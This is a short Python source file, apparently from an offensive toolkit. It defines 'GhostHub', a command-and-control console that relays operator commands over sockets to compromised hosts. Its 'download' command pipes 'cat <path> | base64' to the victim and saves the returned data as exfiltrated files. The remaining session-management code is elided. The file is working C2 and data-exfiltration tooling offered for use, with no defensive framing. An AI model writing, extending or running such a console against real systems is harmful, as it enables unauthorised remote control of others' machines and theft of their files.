import socket
import threading
from rich.console import Console
from core.ui import draw_header

console = Console()


class GhostHub:
    def interact(self, s_id, sock):
        console.print(
            f"[*] Session {s_id} Active. Commands: 'download <path>', 'shell', 'back'")
        while True:
            cmd = console.input(f"Ghost-{s_id}> ").strip()
            if cmd == "back":
                break

            # Powerful Improvement: Built-in File Exfiltration
            if cmd.startswith("download "):
                path = cmd.split(" ")[1]
                sock.send(f"cat {path} | base64\n".encode())
                data = sock.recv(1000000).decode()
                with open(f"exfil_{s_id}_{path.split('/')[-1]}", "w") as f:
                    f.write(data)
                console.print(
                    f"[green][+] File exfiltrated and saved.[/green]")
            else:
                sock.send((cmd + "\n").encode())
                console.print(sock.recv(4096).decode())


def run_ghost_hub():
    hub = GhostHub()
    draw_header("GHOST-HUB: C2 Management")
    # (Rest of existing session management logic...)
